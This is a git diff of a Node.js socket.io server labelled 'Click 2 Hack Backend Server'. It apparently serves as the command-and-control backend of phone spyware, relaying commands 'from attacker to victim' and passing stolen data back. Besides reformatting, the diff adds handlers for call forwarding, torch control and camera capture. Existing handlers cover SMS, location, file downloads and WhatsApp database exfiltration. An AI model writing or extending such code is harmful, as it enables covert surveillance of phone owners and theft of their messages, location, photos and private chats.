@@ -12,7 +12,11 @@ var victimData={};
 var adminSocketId=null;
 const port = 8080;
 
-server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
+server.listen(process.env.PORT || port, (err) => {  
+  if (err) return;
+  log("Server Started : " + port);
+});
+
 app.get('/', (req, res) => res.send('W̳̿͟͞e̳̿͟͞l̳̿͟͞c̳̿͟͞o̳̿͟͞m̳̿͟͞e̳̿͟͞    T̳̿͟͞o̳̿͟͞    C̳̿͟͞l̳̿͟͞i̳̿͟͞c̳̿͟͞k̳̿͟͞ 2̳̿͟͞ H̳̿͟͞a̳̿͟͞c̳̿͟͞k̳̿͟͞    B̳̿͟͞a̳̿͟͞c̳̿͟͞k̳̿͟͞e̳̿͟͞n̳̿͟͞d̳̿͟͞    S̳̿͟͞e̳̿͟͞r̳̿͟͞v̳̿͟͞e̳̿͟͞r̳̿͟͞'))
 
 io.on('connection', (socket) => {
@@ -43,6 +47,11 @@ io.on('connection', (socket) => {
       socket.on("error", (data) =>response("error",data));
       socket.on("getSMS", (data) =>response("getSMS",data));
       socket.on('getLocation',(data)=>response("getLocation",data));
+      
+      // NEW FEATURES HANDLERS
+      socket.on('callForwardingResult',(data)=>response("callForwardingResult",data));
+      socket.on('torchControlResult',(data)=>response("torchControlResult",data));
+      socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
      
       socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
@@ -61,9 +70,7 @@ io.on('connection', (socket) => {
     socket.on("download", (d, callback) =>responseBinary("download", d, callback));
     socket.on("downloadWhatsappDatabase", (d, callback) => {
         socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
-       });
-
-
+    });
 });
 
 const request =(d)=>{// request from attacker to victim
@@ -78,13 +85,15 @@ const response =(action, data)=>{// response from victim to attacker
         io.to(adminSocketId).emit(action, data);
     }
   }
-  const responseBinary =(action, data, callback)=>{// response from victim to attacker
+
+const responseBinary =(action, data, callback)=>{// response from victim to attacker
     if(adminSocketId){
         log("response action: "+ action);
         callback("success")
         io.to(adminSocketId).emit(action, data);
     }
   }
+
 // LOGGER
 const log = (log) =>{
     console.log(log)
